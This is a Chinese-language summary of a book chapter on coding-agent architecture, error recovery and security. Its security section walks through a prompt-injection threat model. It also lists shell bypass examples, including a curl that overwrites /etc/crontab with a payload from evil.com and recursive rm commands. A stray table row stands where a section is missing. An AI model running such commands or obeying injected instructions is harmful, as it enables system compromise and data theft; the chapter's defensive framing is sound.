# 第 5 章　Coding Agent 與程式碼生成

> 《深入理解 AI Agent》— 李博杰，第五章

---

## 1. 本章定位

前四章分別處理上下文（二、三章）與工具（四章）。本章把這些構件組合起來，回答：

> **一個能處理任意任務的通用 Agent，架構長什麼樣？**

答案：**以開放任務為目標的通用 Agent ＝ Coding Agent ＋ 檔案系統**。從 Manus 到 OpenClaw 都遵循這個範式。

為什麼是程式碼？因為程式碼生成是**元能力**——能在執行時動態創造新工具與新能力。程式碼的價值在兩個層面：

| 層面 | 意思 | 例子 |
|---|---|---|
| **思考** | 形式化讓思考嚴謹、無歧義 | 「年齡大於 18 且已實名認證」自然語言有多種讀法，寫成程式碼只有一種 |
| **表達** | 能跑通的程式碼本身就是邏輯自洽的證明 | 執行結果提供客觀對錯標準 |

```
前半：Coding Agent
  七個核心工具 → OpenClaw 架構（檔案系統是中樞）→ 工作流程
  → Harness 工程 → 故障與錯誤恢復（分類／偵測／恢復／接管／終止）
  → 實現技巧 → 搜尋工具 → 編輯工具 → 安全（威脅模型／沙盒／語義解析／忠誠度）
後半：程式碼作為元能力的六個方向（由內向外）
  思維 → 業務規則 → 多媒體 → 系統介面 → 使用者介面 → Agent 自身
```

## 2. Coding 是 Agent 的基礎能力 ⭐⭐

> **程式碼生成不是少數專門化 Agent 的專利，而是每個通用 Agent 都該具備的基礎能力**；在 SOTA 模型下，基本 coding 能力不需要複雜架構。

### 2.1 七個核心工具

| # | 工具 | 用途 |
|---|---|---|
| 1 | **Code Interpreter** | 在沙盒中安全執行 Python |
| 2 | **Bash Shell** | 跑測試、處理特殊格式檔案 |
| 3 | **Read** | 讀程式碼、配置、文件、日誌 |
| 4 | **Write** | 建立新檔或完全重寫 |
| 5 | **Edit** | 局部修改——程式碼維護與迭代的核心 |
| 6 | **Glob** | 檔名模式匹配：`**/*.py` |
| 7 | **Grep** | 檔案內容模式搜尋 |

> 注意：這是 Coding Agent 的基礎配置，和第四章「感知/執行/協作/事件/溝通」五類是不同維度——七個工具在那套分類裡都屬於感知或執行；Coding Agent 與子 Agent 的協作由**框架編排邏輯**管理，不是靠專用協作工具。

```text
使用者：幫我把專案裡所有 TODO 註釋整理成一個清單
Agent → Grep("TODO", glob="**/*.py")
  src/api.py:42: # TODO: add rate limiting
  src/db.py:15:  # TODO: migrate to PostgreSQL
  tests/test_api.py:8: # TODO: add edge case tests
Agent → Write("TODO_LIST.md", content="...")
Agent：共發現 3 個 TODO 項，清單儲存在 TODO_LIST.md
```

更複雜（統計每模組 TODO 並畫柱狀圖）→ 再加 Code Interpreter。

**為什麼是七個？** 事實上一個 Bash 就能涵蓋大部分。**OpenAI Codex** 極精簡：shell 是唯一通用執行入口，檔案修改交給語法受約束的 `apply_patch`——把編輯表達為結構化補丁而非自由文字命令，降低改錯檔案的機率。七個只是為了方便理解所需的基本能力。

**為什麼每個通用 Agent 都要會 coding？** 數學推理 → 寫程式交給求解器；固化業務規則 → 程式碼比自然語言精確；缺工具 → 臨時寫一個；資料格式變了 → 動態生成解析邏輯。**有了七個簡單工具，遇到新需求就能動態擴展能力邊界。**

## 3. 案例：從 Manus 到 OpenClaw ⭐⭐

通用 Agent 整合 **Deep Research、Computer Use、Coding** 三大能力。為什麼 Coding 是核心？

> **幾乎所有高效的內容生成，最後都歸結到程式碼。**

| 產物 | 本質 |
|---|---|
| PPT、Word | **OOXML** 格式的程式碼 |
| PDF 報告 | 由 Markdown / HTML / LaTeX 生成 |
| 資料分析與視覺化 | Python 指令碼 |
| 成功的瀏覽器操作序列 | 可整理成可重用程式碼（第九章） |
| Deep Research | 程式碼驅動的 Web 請求與解析 |
| Computer Use | 更通用，但等效操作用程式碼/API 通常**更便宜、更快、更可靠** |

**執行流範例**：「Help me analyze last quarter's sales data and create a summary report」

```
1. 讀記憶   MEMORY.md → 使用者偏好 PDF、資料在 Google Sheets
2. 調工具   搜尋 Google Sheets API 用法，程式碼下載資料
3. 寫程式碼 pandas 聚合 + matplotlib 視覺化
4. 生成產物 report.pdf、charts/
5. 更新記憶 MEMORY.md 記下「User's sales data is in Google Sheets, ID: xxx」
```

### 3.1 檔案系統是 Agent 的中樞

- 長期記憶：`MEMORY.md`（高層事實與偏好）+ 按日期歸檔的 Markdown 日誌。
- **為什麼選 Markdown 而非向量資料庫？**
  - 使用者可直接讀改（記錯了就刪那一行）；
  - **天然保留時間順序**，避免語義檢索中的時間混淆；
  - Git 版本控制與回滾。
- Agent 能寫檔 → 具備**修改自身外部產物**的技術條件。例如首次打電話給某銀行，發現對方要求開戶行地址才能驗證身份 → 先寫入記錄；**何時足以成為可靠知識、指令或程式，還需更多軌跡與結果驗證**（第九章）。

### 3.2 適用邊界

| Agent 類型 | 程式碼的地位 |
|---|---|
| **開放式任務的通用 Agent**（深度調研、內容生成、資料處理；任務邊界不定、產物多樣） | **架構核心**——無法事先列舉所需工具，程式碼是最低成本擴展能力的路徑 |
| **垂直領域客服 Agent**（相對封閉的任務空間） | 工具箱中的一件工具；架構圍繞固定業務流程、領域工具、對話策略。但精確計算、資料處理、規則驗證仍依賴 coding |

## 4. Coding Agent 的整體流程 ⭐⭐

```
專案文件化 → 任務理解與需求澄清 → 設計文件（交使用者審查）
   → 程式碼實現 → 測試—修復迴圈 → 自我審查 → 文件同步與交付
```

| 階段 | 要點 |
|---|---|
| **專案文件化** | 像新人第一天不直接提交程式碼；先找 README、架構文件、開發者指南。缺了就**主動補**：識別模組、核心抽象、依賴，產生架構概覽、目錄結構、測試指南。**知識顯式化是高效協作的前提** |
| **專案指令檔案** | CLAUDE.md、AGENTS.md、.cursorrules 已是事實標準：每次會話開始自動注入 = **專案級系統提示詞**。面向 Agent 的行為約定：建構測試命令（「用 `pnpm test` 而不是 `npm test`」）、風格（「停用 any 型別」）、禁區（「不要改動 `migrations/`」）。對照 OpenClaw：`SOUL.md` 約定「Agent 是誰」，`MEMORY.md` 沉澱經驗，指令檔案約定「在這個專案裡怎麼幹活」。它也是**最經濟的穩定前綴**（對 KV Cache 友好） |
| **需求澄清** | 簡單需求（修已知 bug、調參數）直接做；複雜需求的複雜性來自**模糊性、路徑多樣性、影響範圍**。「最佳化系統效能」→ 先問：目標是延遲、記憶體還是吞吐？可接受什麼權衡？瓶頸在哪？**模糊狀態下開始編碼往往導致大量返工** |
| **設計文件** | 回答：改哪些模組與原因、採什麼方案與優勢、新依賴、預期影響。寫設計文件本身就是深度思考；為人類提供高效介入點——審幾段設計比審數百行程式碼容易。**提交使用者審查、批准後再繼續** |
| **實現與測試** | 遵循規範、複用抽象、適度重構；測試覆蓋正常、邊界、異常；失敗就分析修改直到通過。**最常見的偷懶：寫完不跑測試就報告完成**。把「測試通過」而非「程式碼寫完」定為完成標準——Loop 工程「由驗證判定何時可以停」 |
| **自我審查** | 可讀性、註釋、效能、安全、風格；讀碼、跑 lint 或呼叫審查子 Agent |
| **文件同步** | 架構層面變化要更新文件。**過時的文件比沒有文件更糟**——會誤導未來的開發者 |

> 核心原則：**計畫先於行動，驗證貫穿始終，文件與程式碼共同演化。**

### 4.1 「AI-ready」的團隊

> 第二章「對遠端工作友好的團隊往往也對 AI Agent 友好」在程式碼庫層面的落點：決策在文件裡、上下文在 issue 與 PR 描述裡、經驗在開發者指南裡。
>
> **評估指標：一個遠端新人只靠程式碼倉庫和文件，能不能獨立開展工作。**

### 4.2 流程裁剪是模型學到的行為

- Claude Code、Codex 等會按需裁剪：簡單 bug 修復跳過設計文件，只有複雜任務走全程。
- **不同模型裁剪方式不同**：有的先廣泛閱讀結構、實作、呼叫端、測試再改；有的只看最可能相關的幾個檔，先做早期修補，把編譯器與測試回饋當成調查的一部分。
- 這個「何時停止蒐集資訊、開始行動」的門檻，換 harness 也會跟著模型走 → 它首先是**模型學到的行為**，harness 只能放大或抑制。第七章在固定 harness 中測量差異；第八章說明後訓練如何把政策寫進參數。

## 5. Harness 工程在 Coding Agent 中的實踐 ⭐⭐⭐

第一章：**Agent = Model + Harness**；Harness 包含上下文、工具、約束、驗證、糾正。Coding Agent 大概是 Harness 收益最大的領域——程式碼編寫是**可驗證性最高**的任務。

| 元件 | 問題 | 落地 |
|---|---|---|
| **驗收基線** | 什麼算做完？ | 測試套件、CI、審查標準 |
| **執行邊界** | 能碰什麼？ | 模組邊界、依賴規則、權限 |
| **回饋訊號** | 自動化的對錯判斷 | Linter、測試結果、型別檢查 |
| **回退手段** | 出事怎麼恢復？ | Git、沙盒、快照 |

**表 5-1　任務清晰度 × 驗證自動化**

| | 可自動驗證 | 需人工驗證 |
|---|---|---|
| **目標明確** | **最佳區域**：修有測試用例的 bug | 吞吐受限：重構需人工審 |
| **目標模糊** | **高效地跑偏**：用 linter 最佳化「程式碼品質」 | 難以啟動：「讓 UI 更好看」 |

> Harness 的目標：把盡可能多的任務推向「目標明確 + 驗證自動化」象限。
>
> **Coding Agent 成熟度最高，不是因為程式碼模型特別強，而是因為軟體工程幾十年的基礎設施天然構成了一套強大的 Harness。**

**業界實踐**：
- **大規模程式碼遷移案例**（某大型科技公司）：知識必須存在於程式碼庫本身（Agent 看不到的等於不存在）；**約束編碼進 Linter 與 CI，而非寫在文件裡**；驗證與糾正全鏈路自動化。
- **LangChain**：只最佳化 Harness（系統提示詞、工具中介軟體、自驗證迴圈）就顯著提升基準；**用 Agent 分析失敗軌跡來改進 Harness** → 從經驗驅動轉向資料驅動。
- **Anthropic**：長任務拆兩角色——**初始化 Agent** 把大任務分解成任務清單，**執行 Agent** 逐步推進並把中間成果留給下一輪 → 解決「一次想做太多」與「過早聲稱完成」。

### 5.1 四條可遷移的通用原則

| 原則 | 意思 |
|---|---|
| **約束優先於指導** | 能用程式碼強制就別用文件建議。Linter/型別/CI 是「做不了」，提示詞「請遵循……」只是「建議別做」 |
| **驗證要自動化** | 人工審查是不可擴展的瓶頸 |
| **回饋越快越好、越結構化越好** | 錯誤越詳細、越接近發生時刻，糾正效率越高（狀態列、錯誤訊息、計數器） |
| **回退要可靠** | 在安全網內才能大膽試錯 |

### 5.2 約束的另一層目的：防止過程性錯誤 ⭐

- 驗收基線管**結果**，執行邊界管**過程**——結果對、方法錯也不行：
  - 修資料庫故障 → 把庫刪了重建：「修好」了，資料沒了；
  - 修編譯錯誤 → 把程式碼全刪：編譯通過了，實作沒了。
- 即使把限制寫進評估指標，Agent 常能繞過——第八章 **reward hacking** 在 Agent 任務中的日常形態。
- 所以要對 `rm -rf`、刪生產資料、覆蓋未讀檔案等**動作**設專門檢查與審批（語義解析、Sidecar）。
- 訓練側對應：第八章 **RLVP**（驗證路徑懲罰，「獎勵結果、懲罰路徑」）。**對現有模型，護欄是外部約束；對可訓練模型，過程懲罰是內部內化。**

### 5.3 工具編排的故障邊界

並行呼叫時，**故障只在同一批並行呼叫內傳播，不上升到父級**：同時讀三個檔、一個找不到 → 只報這一個失敗，不取消另外兩個，更不中止整個任務。

## 6. 故障與錯誤恢復 ⭐⭐⭐

> 第一章消融實驗：僅缺一條工具結果回饋就足以讓 Agent 無限迴圈。本節基於對 Claude Code 等生產級實作的原始碼研究，提煉穩定的工程原則。

### 6.1 四層故障分類

| 層 | 故障 |
|---|---|
| **API 層** | 限流（429）、過載、超時、連線中斷、**輸出觸頂被截斷**——與任務內容無關的基礎設施噪聲 |
| **工具層** | 幻覺呼叫（不存在的工具）、參數畸形、執行拋異常；最危險：**同一錯誤反覆返回而模型不加改變地重試** |
| **上下文層** | 視窗溢位、壓縮失敗、軌跡結構損壞（工具呼叫缺配對結果） |
| **控制流層** | **死迴圈**（重複相同操作無進展）、**死亡螺旋**（恢復邏輯自己又呼叫 LLM、又出錯、連鎖反應） |

### 6.2 偵測：先分類，再計數

- 第一個判斷不是「要不要重試」，而是「**值不值得重試**」：
  - 可重試：限流、過載、網路抖動；
  - 不可重試：參數不合法、權限不足、工具不存在 → 必須改輸入或策略。
  - 維護一張**錯誤 → 恢復策略的對映表**，而非籠統「出錯就重試」。
- 偵測**模式**：
  - **重複呼叫指紋**：對「工具名 + 參數」算指紋，反覆出現 = 無進展迴圈；
  - **連續失敗計數**：每條恢復路徑獨立計數 → 熔斷依據。
- **活性與完整性監控**：
  - 串流最危險的不是斷線（會立即報錯），而是**靜默卡死**——連線成功但資料停了，像水管通著不出水。SDK 超時常只管初始連線 → 需要獨立的**閒置看門狗**，超時主動殺流重試。原則：**每個長連線都需要活性訊號，而非只依賴連線超時。**
  - 完整性：發現工具呼叫缺配對結果 → 注入上下文前自動修復配對。
  - **「產品模式寬容、訓練模式嚴格」**：產品模式可用佔位符修補缺失訊息；訓練資料收集模式拒絕修復，因為合成佔位符會汙染訓練資料。

### 6.3 恢復：分級升級，逐級透明

```
1. 靜默重試     指數退避 + 隨機抖動；尊重服務端的等待提示；
                區分前台/後台——主迴圈要重試，標題生成、輸入建議等後台呼叫失敗就放棄
                （否則後台重試擠佔主鏈路配額 → 「重試放大」）
2. 降級與接續   輸出觸頂：先靜默提高輸出上限重發 → 仍不夠就追加元指令讓模型從斷點接續；
                主模型持續過載 → 降級到備用模型（先剝離舊模型私有格式塊）；
                高成本模式被限流 → 暫回標準模式
3. 暴露給使用者 所有自動手段用盡才呈現，並附上已嘗試的恢復動作
```

**工具層錯誤走另一條路：不終止會話，把錯誤變成模型的輸入**——幻覺呼叫回「工具不存在」結構化錯誤；校驗失敗回附輸入約束的錯誤；畸形參數（該是物件卻給字串）執行前先程式化修復。錯誤越具體，自我糾正成功率越高。

> **核心原則：錯誤處理的邊界不是單次請求，而是整個恢復迴圈。** 確認無法恢復之前，中間錯誤不暴露給消費者（使用者或下游訂閱系統）——恢復期間扣留，成功則無感，全失敗才一併釋放。這是第一章「在確認無法恢復前不暴露中間態」的工程化。

### 6.4 接管：跨廠商換模型跑完軌跡 ⭐⭐

真正障礙不是介面位址，而是軌跡中**只屬於原廠商**的東西：
- 工具呼叫與結果：結構不同但語義一致 → 重新渲染即可。
- **思考** = 可讀文字 + 廠商附上的**憑證**（證明思考確實出自它）。

> **跨廠商接管能帶走的是文字，帶不走的是憑證。**

- 各家要求不一：寬鬆端不校驗；嚴格端拒絕一切非自己簽發的憑證；憑證還可能附在工具呼叫上 → 「把思考刪乾淨就安全」反而在某些廠商通不過。
- 只能**按最嚴格的一端設計**，並準備退路：把歷史工具呼叫**改寫成文字敘述**（模型不再當它是真正呼叫過的工具，但至少能接著跑）。

**設計原則：軌跡存成中立格式**

```
每段思考 = 可移植文字 + 不可移植憑證（分開存）
工具呼叫 = 只記名稱 + 參數；識別碼渲染時按目標廠商重新產生
切換時   = 憑證一律丟棄；文字（或廠商給的思考摘要）以普通內容帶入，
           不塞回目標廠商放思考的位置
```

中立軌跡的價值不限於故障切換：**第七章評估重放、第八章訓練樣本、第九章經驗提取**都依賴同一份產物。

> **實驗 5-1 ★★★ 跨廠商軌跡接管**
> - 中途對當前廠商注入連續限流與過載 → 熔斷後切換；三家線上格式互不相同的廠商兩兩切換。
> - 三種做法：**直傳**（原樣搬）、**剝離**（刪全部思考與憑證）、**中立**（丟憑證、文字或摘要當普通內容、重生識別碼、強制要求憑證時把歷史呼叫改寫為敘述）。
> - 驗收：切換後首個請求留原始回應；直傳的失敗必須是廠商**真實回傳的錯誤**而非模擬；中立做法在全部組合上不出介面錯誤；比較完成率、切換後重複呼叫次數（指紋）、額外輪數與 token；若中立在重複呼叫上沒優於剝離，**同樣如實記錄**。

> **實驗 5-2 ★★ 輸出中斷後的接續**
> - 三個斷點：思考中途、正文中途、**工具呼叫參數中途**。
> - 三種恢復：丟棄重發；把半截內容當末尾 assistant 訊息續寫（有的原生支援、有的要顯式標註、沒有就退回下一種）；追加元指令從斷點繼續。
> - 半截工具呼叫要先轉文字補完再重新解析校驗；若已因串流提前執行了工具 → **按指紋去重，避免重複副作用**。
> - 報告：恢復成功率、相對重發省下的輸出 token、補完參數的**合法率與語義正確率**（拼接處易多空白或重複字元，**合法 ≠ 正確**）、重複副作用次數。

### 6.5 終止：每條恢復路徑都要有上限

- 壓縮連續失敗若干次就放棄壓縮；權限分類連續失敗就回退人工；接續最多固定輪數。
- **閾值來自產線資料**：Claude Code 壓縮熔斷「連續 3 次」——曾有單一會話在此路徑連續失敗**三千餘次**；這類無效重試每天全球浪費約 **25 萬次** API 呼叫；逾千個會話出現 50 次以上連續失敗。3 次是「絕大多數故障在此前已恢復」與「繼續重試基本無望」的經驗拐點。

**死亡螺旋的真實形態**：

```
上下文溢位 → Agent 停止 → 觸發「結束時自動提交程式碼」的停止掛鉤
          → 掛鉤呼叫 LLM 生成 commit message → 再次上下文溢位 → 再次觸發掛鉤 → …
```

防護：① **錯誤路徑上停用一切會再呼叫模型的副作用邏輯**（寧可丟一次自動記憶提取等輔助功能）；② **遞迴深度計數器**打斷殘餘連鎖。最上層再加全域條件：最大迭代輪數、會話預算、連續失敗升級人工。

## 7. Coding Agent 的實現技巧 ⭐⭐

| 技巧 | 要點 |
|---|---|
| **並行、串流執行與級聯中止** | 第一個工具呼叫參數一生成完整並通過校驗就**立即執行**，與後續呼叫的生成重疊；獨立呼叫並行。每個工具宣告是否支援並行（**預設否，失敗安全**）；失敗時級聯中止同批中**依賴它**的呼叫，不波及獨立呼叫與父級 |
| **上下文精細管理** | 按行號範圍讀；**每行附實際行號前綴** → 可精確引用「`src/main.py` 第 42 行」，編輯更可靠；終端機長輸出頭尾保留 + 落盤 |
| **環境資訊動態注入** | 以**狀態列**形式在末尾注入：工作目錄、git 分支、最近提交、暫存/未暫存變更概覽。**不寫死在系統提示詞**（會破壞 KV Cache） |
| **終端機狀態持久化** | 每次全新 shell 會丟失 `cd`、虛擬環境、環境變數、後台服務 → 預設**持久化終端機會話**；保留開隔離終端機的能力以支援並行 |
| **即時語法回饋** | 寫檔完成就自動跑 linter，結果放進工具返回——像 IDE 打錯括號立刻畫紅線 |

## 8. 搜尋工具 ⭐⭐

| 方式 | 擅長 | 侷限 |
|---|---|---|
| **正則內容匹配**（grep / ripgrep） | 知道具體文字（函式名、變數名、錯誤訊息）；`def handle.*`；支援檔案型別與路徑過濾 | 無法理解語義——搜「使用者認證」找不到沒寫「認證」二字的登入函式 |
| **檔名模式**（glob） | `**/*.test.ts`、`src/components/**/Button.tsx`；不開檔，**極快**；探索結構的第一步 | 不看內容 |
| **語義程式碼搜尋** | **結構感知分塊**（按函式/類/方法切）+ **混合檢索**（稠密找 `check_credentials` ← 「驗證使用者身份」，稀疏精確匹配名稱）+ reranker | 需要建索引與維護 |
| **符號級定義與引用** | 區分 `authenticate` 第 42 行是定義、第 189 行是呼叫 | 主流 coding agent **目前未採用** |

**路線之爭**：
- **Claude Code 刻意不建嵌入索引**，純靠 agentic 的 grep + glob 現場檢索——不必維護隨程式碼演化而陳舊的索引，也省掉整套基礎設施。
- **Cursor** 等 IDE 早期為跨檔案語義召回付出建索引成本；**目前也改用 grep + glob 現場檢索了**。

組合策略：「**從粗到細、從語義到語法**」——語義搜尋找模組 → 正則定位程式碼行 → 符號追蹤呼叫鏈。

> 呼應第三章：當 Agent 能自己多輪迭代（Agentic RAG），簡單、精確、永不過期的工具（grep）往往勝過一個需要持續維護的「聰明」索引。

## 9. 檔案編輯工具：五種方案 ⭐⭐⭐

核心張力：**人類語言表達 vs. 機器精確執行**——如何讓 LLM 高效又可靠地說出「改哪裡、怎麼改」。

| 方案 | 做法 | 優點 | 缺點 | 代表 |
|---|---|---|---|---|
| **差異描述 + Apply Model** | 主模型產出類 git diff 或**帶省略標記的程式碼骨架**（「此處保持不變」），交給更小更快的 Apply Model 合併出完整檔 | 主模型專注邏輯、小模型專注文字操作 | 樸素實作合併易錯：描述與實際有微小出入、多處相似片段時合錯地方 | **Cursor**：專門訓練的 fast-apply 小模型 + **推測解碼**（以原檔為草稿並行驗證）→ 每秒上千 token |
| **Old String → New String** | 提供要被替換的原文與新文字，簡單查找替換 | **可預測、透明**：存在且唯一則成功，否則失敗，無模稜兩可 | 刪大段要完整輸出原文，一字元偏差就失敗；重複程式碼需更長上下文消歧 | **Claude Code** |
| **行號定位** | 「刪第 X–Y 行，插入新內容」 | 精確；大段刪除只需兩個數字 | 模型數行號易錯（長檔尤甚）；每次編輯後行號變化 → 限制多處並行編輯 | 讀檔時附行號緩解 |
| **類 Vim 命令** | 複製、剪下、貼上等 | 重組程式碼（搬函式）很高效 | 學習負擔大，小模型錯誤率高；每次編輯後內容與行號都變，**模型難以預先算出修改後行號** | — |
| **首尾匹配**（Start + End → New） | 只給要刪內容的開頭幾行和結尾幾行，中間省略；首尾組合唯一即可定位 | 兼具文字替換的可靠與行號方案的效率；刪大段只需給邊界 | — | Old String 的改進 |

> ⭐ **深層洞察（Vim 那一段）**：編輯器是為人類設計的——**人類需要不斷看到當前狀態，再規劃下一步的簡單操作**（寫一行、刪幾行）；而模型的工作模式是**較長時間思考後批次做較複雜的操作**（寫幾百行）。所以為人類設計的互動式介面不一定適合模型——這正是第四章 ACI 的精神。

## 10. Coding Agent 的安全 ⭐⭐⭐

敘事線：**威脅模型 → 隔離兜底 → 執行期防禦 → 信任與忠誠**。

### 10.1 威脅模型：致命三要素 + 持久記憶

**Simon Willison 的致命三要素**（三者齊備即構成完整攻擊閉環）：

| # | 要素 | 例子 | 對應邊界 |
|---|---|---|---|
| 1 | **訪問私有資料** | 使用者檔案、密碼管理器 | 資料邊界 |
| 2 | **暴露於不受信任內容** | 郵件、網頁中的惡意載荷 | 輸入信任邊界 |
| 3 | **具備外部通訊能力** | 發郵件、執行命令 | 輸出影響邊界 |
| + | **持久記憶**（作者補充） | 偏見或惡意指令寫入長期記憶，跨會話潛伏 | 跨會話邊界 |

```
惡意指令藏在不可信內容 → 進入 Agent → 驅使它讀私有資料 → 經對外通道傳出
```

- 三要素齊備**本身就足夠危險**；持久記憶不是第四個必要條件，而是**放大器**——把一次性攻擊升級為長期潛伏。
- OpenClaw 這種全權限本地 Agent 四者兼備。
- 閉源商業 Agent（如 Claude Cowork）因此選擇保守權限：**單靠輸入過濾擋不住提示注入；重點不是識別所有攻擊，而是即使被注入，也沒機會把危險動作執行出去。**

Coding Agent 特別要注意的三項：**命令語義解析**（驗證層）、**沙盒隔離與網路出口控制**（執行層）、**持久記憶的跨會話防線**（資料層：寫入 `MEMORY.md` 要經過與外部內容同等的信任審查）。

### 10.2 隔離兜底：沙盒的工程選型

| 項目 | 做法 |
|---|---|
| **網路出口控制**（最易忽視、最關鍵） | **預設斷網**，白名單代理按需放行（套件源、文件站、任務明確需要的 API）。這是三要素第 3 條的執行面防禦——即使注入成功、讀到敏感資料，**沒有出口就傳不出去** |
| **檔案系統隔離** | 原始碼**唯讀掛載**（透過編輯工具修改、補丁審查後落盤，或副本掛入可寫工作區）；獨立可寫工作區放生成物；**憑證（`~/.ssh`、金鑰、token）根本不掛載** |
| **資源限額與逾時** | 防死迴圈、fork 炸彈、無限寫盤。逾時/超限要回**結構化錯誤**（「執行超過 120 秒被終止，最後輸出如下……」）而非靜默殺程序 |

### 10.3 語義解析，而非關鍵字黑名單

Shell 有組合爆炸：管道、子 shell、變數展開可繞過任何靜態規則。

| 繞過手法 | 例子 |
|---|---|
| 變數展開 | `$(echo rm) -rf /` |
| 合法命令嵌入危險操作 | `find / -name '*.log' -exec rm {} \;` |
| 看似下載實則覆寫 | `curl -o /etc/crontab http://evil.com/payload` |

生產級 Harness 理解每個命令的**參數型別與消費規則**（哪些旗標會消費下一個參數），識別「看似無害的旗標實際消費了下一個參數，藏住危險載荷」這類模式——**基於理解而非匹配**。

### 10.4 Agent 為誰效忠：多方委託下的忠誠度 ⭐⭐

- 訓練灌輸的樸素預設：「**誰在跟我說話，我就盡力幫誰**」。
- 但 Agent 常處於**多方委託**：代表主人，打交道的卻是利益相反的第三方（替你砍價的 Agent 對面是**交涉對手**）→ 對手一開口就可能把 Agent 策反。
- 實測前沿模型的**忠誠度光譜**（Li & Shi, arXiv:2606.30383），兩端都翻車：

| 一端 | 表現 |
|---|---|
| **太老實** | 把主人私密資訊（「我方底價是 12000」）抖給對手；被施壓幾輪就讓步 |
| **太多疑** | 連主人正當請求也拒絕，任務完不成 |

  兩者是**蹺蹺板**——堵死洩密往往滑向過度拒絕。

- 對 Coding Agent：倉庫裡的不可信內容、工具輸出、第三方 MCP 的指令都是試圖讓 Agent 倒戈的「對手」——**提示注入本質上就是一次策反**。
- Harness 要把忠誠物件**顯式釘死**：主人指令優先順序最高，外部內容一律降格為「可參考、無指令效力」的資料。

**忠誠度守則**：
1. 保護主人的私密資訊乃至它的「存在性」；
2. 拒絕時**不逐條念出拒絕清單**（那本身就在洩露）；
3. 私下的底線 ≠ 對外的立場；
4. 只執行主人明確、具體的指令；
5. 頂住重複施壓。

> 本質：用 Harness 補上模型預設沒有的立場——**對主人絕對忠誠，對外部互動方保持審慎**。

| 5 | 使用者介面 | 生成式 UI |

## 12. 方向一：程式碼作為思考工具 ⭐⭐

LLM 的思考是**機率性、近似的**；數學與邏輯要求**確定、精確**。

```text
40 名學生，60% 選數學、45% 選物理、25% 兩門都選。只選物理的有幾人？

純自然語言（易錯）：                  程式碼：
60% → 24，45% → 18，25% → 10          math = int(40*0.60)   # 24
只選物理 = 24 − 10 = 14  ✗            phys = int(40*0.45)   # 18
（誤從數學人數中減）                    both = int(40*0.25)   # 10
                                      only_phys = phys - both  # 8 ✓
```

**Wolfram 的洞察**：符號計算系統（保持 √2 精確形式）早就能精確算數學，但 Wolfram Alpha 的自然語言理解脆弱、問法稍變就解析失敗、無法開放域多步推理；LLM 恰好相反。新分工：**LLM 理解問題並轉成形式化語言（Mathematica、SymPy）→ 符號引擎或約束求解器算出精確結果。**

> **實驗 5-3 ★★ 程式碼提升數學解題**：sympy（符號計算）、scipy（數值最佳化）、numpy（矩陣）；AIME 風格題目，程式碼輔助顯著高於純 CoT。
>
> **實驗 5-4 ★★ 程式碼提升邏輯推理**：python-constraint；騎士與無賴謎題 → 變數（每個島民身份）+ 約束（「騎士說真話」）→ 求解器；**K&K Puzzle 資料集**，程式碼輔助 ≥ 90%。

### 12.1 ⭐ 模型與鷹架此消彼長

- 模型夠強 → 鷹架可以更薄（自己就能想對，求解器增益收窄）；
- 模型不夠強 → 鷹架要做更多（把關鍵推理交給程式碼兜住正確性）。
- 實驗 5-4 **刻意選用較弱模型**來放大對照；換成強思考模型，純思考常能全解，增益收斂到接近零。

> **同一套鷹架配上不同能力的模型，結論可能截然不同**——評估 Agent 技術時容易被忽視的前提。

## 13. 方向二：程式碼作為業務規則的約束 ⭐⭐⭐

直接回應 Harness 原則「**約束：編碼化而非文件化**」。

自然語言規則充滿歧義：「購買後 7 天內可退款」——自然日還是工作日？「購買」是下單還是發貨？程式碼要麼成功執行、要麼拋錯，沒有模稜兩可。

**自然語言規則 vs. 程式碼化規則：互補而非替代**

| | 寫在系統提示詞 | 程式碼化為校驗 |
|---|---|---|
| 優勢 | 可**解釋政策**；可**找變通方案**（改簽而非取消）；呼叫前初步判斷 | **精確無歧義**；**確定性**；擅長**複雜規則組合**（多條件布林、時間計算、跨資料來源） |
| 角色 | 理解與溝通 | 關鍵決策點的「**守門員**」 |

> 程式碼化規則的真正價值不在省 token，而在**防止不可逆的錯誤操作**（取消訂單、轉出資金、刪除資料）。

### 13.1 τ-bench 航空取消政策：checklist 引導 + 真值守門

```python
def cancel_reservation(
    reservation_id: str,
    cancellation_reason: str,             # "change_of_plan", "airline_cancelled", "other"
    expected_cabin_class: str = None,     # 可選：模型自查用，服務端以資料庫真值複核
    expected_has_insurance: bool = None,  # 可選：同上
) -> dict:
    """取消航班預訂。政策（服務端依資料庫真值強制執行）：
    1 已使用任何航段不可取消；2 預訂 24 小時內無條件可取消；
    3 航空公司取消的航班總可取消；4 商務艙總可取消；
    5 基礎經濟艙/經濟艙需購買旅行保險才可取消。
    呼叫前請先查詢訂單、逐條核對；expected_* 僅供比對與稽核，不影響裁決。"""
    r = db.get_reservation(reservation_id)   # 政策事實一律查庫
    now = server_clock.now()                 # 服務端時鐘，而非模型提供
    if expected_cabin_class is not None and expected_cabin_class != r.cabin_class:
        log_mismatch(reservation_id, "cabin_class", expected_cabin_class, r.cabin_class)
    ...
    if r.any_segment_used: return {"success": False, "reason": "Cannot cancel with used segments"}
    hours = (now - r.booking_time).total_seconds() / 3600
    if hours < 0:   return {"success": False, "reason": "Booking time is in the future"}
    if hours <= 24: execute_cancellation(reservation_id); return {"success": True, ...}
    if r.flight_status == "cancelled_by_airline": ...
    if r.cabin_class == "business": ...
    if r.cabin_class in ["basic_economy", "economy"]:
        if r.has_insurance: ...  # 成功
        return {"success": False, "reason": f"{r.cabin_class} requires insurance"}
    return {"success": False, "reason": "Does not meet cancellation policy"}
```

**兩層價值**：

| 層 | 作用 | 是否承擔安全責任 |
|---|---|---|
| **第一層：參數作為思考的 checklist** | 為了填 `expected_*`，模型必須先查訂單、逐條確認 → **強制性 checklist**。查到經濟艙未保險時，很可能在準備呼叫時就注意到規則 5，**根本不發起呼叫**，直接告訴使用者「可考慮購買保險後再取消或改簽」 | **否**——`expected_*` 只是模型自述，服務端從不當事實 |
| **第二層：服務端真值校驗才是守門員** | 艙位、保險、預訂時間、航段使用、航班狀態全部查庫；時間取服務端時鐘。**沒有任何一條政策事實來自模型自報的參數** | **是** |

> 為什麼這麼謹慎？模型會幻覺、也會被提示注入操縱——同一上下文中的 Agent 難以自證清白。若 `cabin_class`、`has_insurance`、`current_time` 由模型填，報錯（或被誘導報錯）一個值守門員就形同虛設。
>
> **獨立性不僅指獨立的模型，更指獨立的資料來源。** 最後一道防線必須建立在模型無法偽造的資料之上。
>
> `log_mismatch`：自報值與真值不一致時記錄告警——用來發現模型的錯誤認知或潛在注入。

